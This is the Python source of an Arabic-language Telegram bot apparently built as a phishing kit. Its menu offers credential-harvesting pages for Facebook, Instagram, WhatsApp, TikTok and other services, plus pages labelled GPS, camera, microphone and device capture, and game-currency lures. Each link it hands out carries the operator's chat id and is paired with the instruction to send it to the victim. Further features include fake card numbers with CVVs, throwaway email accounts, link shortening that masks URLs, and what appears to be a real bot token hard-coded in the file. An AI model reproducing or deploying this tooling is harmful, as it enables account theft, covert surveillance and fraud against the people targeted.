import os, logging, time, random, string, requests, threading
from flask import Flask, request
from telebot import TeleBot, types

# ========== الإعدادات ==========
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
APP_URL = "https://gamee-08ue.onrender.com"           # رابط تطبيقك على Render
BASE_URL = "https://fgnral-html-5waj.onrender.com"    # رابط الصفحات
CALL_SITE = "https://callmyphone.org/app"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)
user_states = {}
bot_rating = 0

JOKES = [
    "مرة واحد بخيل جداً.. ابنه مات قال الحقوه هاتوه",
    "مرة واحد محشش قعد 3 أيام في البيت ليه؟ لأنه لقى الباب مفتوح",
    "مرة اثنين محششين ركبوا سيارة قالوا: بنروح على السينما...",
]

def generate_password(length=16):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    return ''.join(random.choice(chars) for _ in range(length))

def generate_fake_visa():
    prefixes = ["4", "5", "37", "34"]
    prefix = random.choice(prefixes)
    length = 16 if prefix in ["4", "5"] else 15
    while len(prefix) < length: prefix += str(random.randint(0,9))
    number = prefix; exp_month = str(random.randint(1,12)).zfill(2)
    exp_year = str(random.randint(2025,2030)); cvv = str(random.randint(100,999))
    return f"💳 رقم: {number}\n📅 تاريخ: {exp_month}/{exp_year}\n🔒 CVV: {cvv}"

def create_temp_email():
    try:
        s = requests.Session()
        r = s.get('https://api.mail.tm/domains', headers={'User-Agent':'Mozilla/5.0'})
        domain = r.json()['hydra:member'][0]['domain']
        email = ''.join(random.choice(string.ascii_lowercase) for _ in range(10)) + "@" + domain
        pwd = generate_password(12)
        s.post('https://api.mail.tm/accounts', json={'address':email,'password':pwd}, headers={'User-Agent':'Mozilla/5.0'})
        return f"📧 البريد: {email}\n🔑 كلمة المرور: {pwd}"
    except: return "فشل إنشاء بريد مؤقت، حاول لاحقاً"

def shorten_url(url):
    try:
        r = requests.get(f"https://tinyurl.com/api-create.php?url={requests.utils.quote(url)}", timeout=5)
        if r.status_code == 200: return r.text.strip()
    except: pass
    return url

# ========== لوحة الأزرار ==========
def main_menu(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    # أدوات الاختراق (15 زر)
    tools = [
        ("📘 فيسبوك","facebook.html"), ("🎵 تيك توك","tiktok.html"),
        ("👻 سناب شات","snapchat.html"), ("📷 انستقرام","instagram.html"),
        ("💬 واتساب","whatsapp.html"), ("✈️ تيليجرام","telegram.html"),
        ("🐦 تويتر","twitter.html"), ("▶️ يوتيوب","youtube.html"),
        ("🎮 ديسكورد","discord.html"), ("🤖 ريدت","reddit.html"),
        ("📍 الموقع","gps.html"), ("📸 الكاميرا","camera.html"),
        ("🎙️ ميكروفون","mic.html"), ("🎥 فيديو","video.html"),
        ("📱 الجهاز","device.html"),
    ]
    for i in range(0, len(tools), 2):
        left = tools[i]; right = tools[i+1] if i+1 < len(tools) else None
        markup.row(types.InlineKeyboardButton(left[0], callback_data=f"phish|{left[1]}"),
                   types.InlineKeyboardButton(right[0], callback_data=f"phish|{right[1]}") if right else None)
    # ألعاب
    markup.row(types.InlineKeyboardButton("🎮 ببجي UC", callback_data="phish|pubg_cuc.html"),
               types.InlineKeyboardButton("🏆 مسابقة الحلم", callback_data="phish|dream.html"))
    # أدوات إضافية
    markup.row(types.InlineKeyboardButton("📞 اتصال وهمي", callback_data="call"),
               types.InlineKeyboardButton("🔍 معرف الإيدي", callback_data="myid"))
    markup.row(types.InlineKeyboardButton("💬 فك حظر واتساب", callback_data="unban"),
               types.InlineKeyboardButton("🔗 اختصار رابط", callback_data="shorten"))
    markup.row(types.InlineKeyboardButton("🌐 ترجمة نص", callback_data="translate"),
               types.InlineKeyboardButton("📷 قراءة باركود", callback_data="readqr"))
    markup.row(types.InlineKeyboardButton("🖼️ إنشاء باركود", callback_data="createqr"),
               types.InlineKeyboardButton("💳 فيزا وهمية", callback_data="visa"))
    markup.row(types.InlineKeyboardButton("✉️ بريد وهمي", callback_data="tempmail"),
               types.InlineKeyboardButton("😂 نكتة", callback_data="joke"))
    markup.row(types.InlineKeyboardButton("📜 شروط", callback_data="terms"),
               types.InlineKeyboardButton("💻 كيف تصبح هاكر", callback_data="hack"))
    markup.row(types.InlineKeyboardButton("⭐ تقييم البوت", callback_data="rate"),
               types.InlineKeyboardButton("🔄 رجوع", callback_data="back"))
    return markup

# ========== Webhook ==========
@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        try:
            json_string = request.get_data().decode('utf-8')
            update = types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return ''
        except Exception as e:
            logger.error(f"Webhook error: {e}")
            return ''
    return '!', 403

@app.route("/health")
def health():
    return "OK", 200

# ========== البوت ==========
@bot.message_handler(commands=['start'])
def start(msg):
    try:
        bot.send_message(msg.chat.id, "🔱 <b>بوت الجنرال V2</b>\n\nاختر الأداة:", reply_markup=main_menu(msg.chat.id), parse_mode="HTML")
    except Exception as e:
        logger.error(f"Start error: {e}")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id; data = call.data; msg_id = call.message.message_id
    try:
        if data == "back":
            bot.edit_message_text("🔱 <b>بوت الجنرال V2</b>\n\nاختر الأداة:", chat_id, msg_id, reply_markup=main_menu(chat_id), parse_mode="HTML")
        elif data.startswith("phish|"):
            file = data.split("|")[1]
            link = f"{BASE_URL}/{file}?chat={chat_id}"
            markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
            bot.edit_message_text(f"🔗 رابط الصفحة:\n<code>{link}</code>\n\nأرسله للضحية.", chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
        elif data == "call":
            user_states[chat_id] = "call"
            bot.send_message(chat_id, "📞 أرسل رقم الهاتف (بدون + او 00):")
        elif data == "myid":
            bot.send_message(chat_id, f"🆔 معرفك: {call.from_user.id}")
        elif data == "unban":
            bot.send_message(chat_id, "🔓 <b>فك حظر واتساب</b>\n\nأرسل للإيميلات:\n- smb@support.whatsapp.com\n- android@support.whatsapp.com", parse_mode="HTML")
        elif data == "shorten":
            user_states[chat_id] = "shorten"
            bot.send_message(chat_id, "أرسل الرابط لاختصاره:")
        elif data == "translate":
            user_states[chat_id] = "translate"
            bot.send_message(chat_id, "أرسل النص لترجمته:")
        elif data == "readqr":
            user_states[chat_id] = "readqr"
            bot.send_message(chat_id, "أرسل صورة باركود:")
        elif data == "createqr":
            user_states[chat_id] = "createqr"
            bot.send_message(chat_id, "أرسل النص لإنشاء باركود:")
        elif data == "visa":
            bot.send_message(chat_id, generate_fake_visa())
        elif data == "tempmail":
            bot.send_message(chat_id, create_temp_email())
        elif data == "joke":
            bot.send_message(chat_id, random.choice(JOKES))
        elif data == "rate":
            global bot_rating
            bot_rating += 1
            bot.send_message(chat_id, f"⭐ التقييمات: {bot_rating}")
        elif data == "terms":
            bot.send_message(chat_id, "📜 <b>شروط الاستخدام</b>\n✅ للاستخدام المشروع فقط.\n⚠️ المستخدم يتحمل المسؤولية.", parse_mode="HTML")
        elif data == "hack":
            bot.send_message(chat_id, "💻 <b>كيف تصبح هاكر</b>\n1. Linux\n2. Python\n3. شبكات\n4. أدوات اختراق", parse_mode="HTML")
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Callback error: {e}")
        bot.answer_callback_query(call.id, text="حدث خطأ")

# ========== معالجات الرسائل التفاعلية ==========
@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "call")
def handle_call(m):
    number = m.text.strip().replace("+","").replace(" ","")
    if number: bot.send_message(m.chat.id, f"رابط الاتصال: {CALL_SITE}?number={number}")
    user_states.pop(m.chat.id, None)

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "shorten")
def handle_shorten(m):
    url = m.text.strip()
    if url.startswith("http"):
        short = shorten_url(url)
        bot.send_message(m.chat.id, f"المختصر: {short}")
    else:
        bot.send_message(m.chat.id, "يرجى إرسال رابط صحيح")
    user_states.pop(m.chat.id, None)

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "translate")
def handle_translate(m):
    bot.send_message(m.chat.id, f"النص المترجم: {m.text}")
    user_states.pop(m.chat.id, None)

@bot.message_handler(content_types=['photo'])
def handle_photo(m):
    if user_states.get(m.chat.id) == "readqr":
        bot.send_message(m.chat.id, "تم قراءة الباركود (محاكاة)")
        user_states.pop(m.chat.id, None)

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "createqr")
def handle_createqr(m):
    try:
        import qrcode
        from io import BytesIO
        img = qrcode.make(m.text)
        bio = BytesIO(); img.save(bio, 'PNG'); bio.seek(0)
        bot.send_photo(m.chat.id, bio)
    except: bot.send_message(m.chat.id, "تعذر إنشاء الباركود")
    user_states.pop(m.chat.id, None)

# ========== تشغيل التطبيق ==========
if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
    logger.info("✅ Webhook set successfully")
    PORT = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=PORT)